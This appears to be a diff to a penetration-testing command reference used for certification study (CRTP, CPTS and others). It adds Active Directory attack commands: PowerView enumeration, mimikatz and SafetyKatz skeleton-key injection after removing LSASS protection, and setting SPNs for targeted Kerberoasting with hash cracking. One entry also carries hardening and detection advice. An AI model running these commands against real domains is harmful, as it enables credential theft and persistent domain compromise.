           "command": "Get-DomainManagedSecurityGroup"
         },
         {
           "label": "Get-DomainForeignUser (users in foreign-domain groups)",
           "command": "Get-DomainForeignUser"
+        },
+        {
+          "label": "Get-DomainForeignGroupMember (foreign members in our groups)",
+          "command": "Get-DomainForeignGroupMember -Domain <domain>"
         },
         {
           "label": "New-DomainUser (create user - needs delegated rights)",
@@ -58780,6 +59169,18 @@ const COMMAND_DATA = {
         {
           "label": "Set-DomainUserPassword (reset - needs Reset-Password right)",
           "command": "Set-DomainUserPassword -Identity <user> -AccountPassword (ConvertTo-SecureString '<pass>' -AsPlainText -Force)"
+        },
+        {
+          "label": "Convert-ADName (convert name formats: DN, NT4, canonical)",
+          "command": "Convert-ADName -Identity '<domain>\\<user>' -OutputType Canonical"
+        },
+        {
+          "label": "ConvertFrom-UACValue (decode userAccountControl flags)",
+          "command": "ConvertFrom-UACValue -Value <uac_int>"
+        },
+        {
+          "label": "Export-PowerViewCSV (thread-safe CSV output)",
+          "command": "Get-DomainUser | Export-PowerViewCSV -CSV <outfile>.csv"
         }
       ]
     },
@@ -69161,8 +69562,16 @@ const COMMAND_DATA = {
       },
       "variations": [
         {
+          "label": "SafetyKatz (CRTP lab tool)",
+          "command": "SafetyKatz.exe '\"privilege::debug\" \"misc::skeleton\"' \"<dc_fqdn>\""
+        },
+        {
+          "label": "LSASS PPL bypass via mimidriv.sys (kernel driver)",
+          "command": "mimikatz # privilege::debug\nmimikatz # !+\nmimikatz # !processprotect /process:lsass.exe /remove\nmimikatz # misc::skeleton\nmimikatz # !-"
+        },
+        {
           "label": "Then auth with the master password 'mimikatz'",
-          "command": "# any DA account now accepts password: mimikatz  (dir \\\\<dc>\\C$ /user:Administrator mimikatz)"
+          "command": "Enter-PSSession -ComputerName <host> -Credential <domain>\\<user>\n# Password: mimikatz"
         }
       ]
     },
@@ -79665,6 +80074,14 @@ const COMMAND_DATA = {
         "secure_config": "# Remove GenericWrite ACEs via AD ACL cleanup:\nRemove-ADPermission -Identity 'DAUser1' -User 'HelpDesk' -AccessRights WriteProperty -Properties 'servicePrincipalName'\n\n# Monitor SPN changes via Event 4738:\n# SIEM: EventID=4738 AND ChangedAttributes contains 'ServicePrincipalName' AND\n# TargetUserName NOT IN (known service accounts) → ALERT: possible targeted Kerberoasting\n\n# Force AES-only on sensitive accounts:\nSet-ADUser DAUser1 -KerberosEncryptionType AES256\n# msDS-SupportedEncryptionTypes = 16 (AES256 only) → RC4 TGS not issuable"
       },
       "variations": [
+        {
+          "label": "Set SPN via AD Module",
+          "command": "Set-ADUser -Identity <user> -ServicePrincipalNames @{Add='nonexistent/BLAH'}"
+        },
+        {
+          "label": "Remove SPN via AD Module (cleanup)",
+          "command": "Set-ADUser -Identity <user> -ServicePrincipalNames @{Remove='nonexistent/BLAH'}"
+        },
         {
           "label": "Crack the targeted hash (John)",
           "command": "john.exe --wordlist=<wordlist> <hashfile>"
@@ -93662,8 +94079,8 @@ const COMMAND_DATA = {
       ]
     }
   ],
-  "totalCommands": 932,
-  "buildDate": "2026-09-09T14:05:02.443Z",
+  "totalCommands": 933,
+  "buildDate": "2026-09-11T20:03:50.070Z",
   "certifications": [
     "CDSA",
     "CPTS",
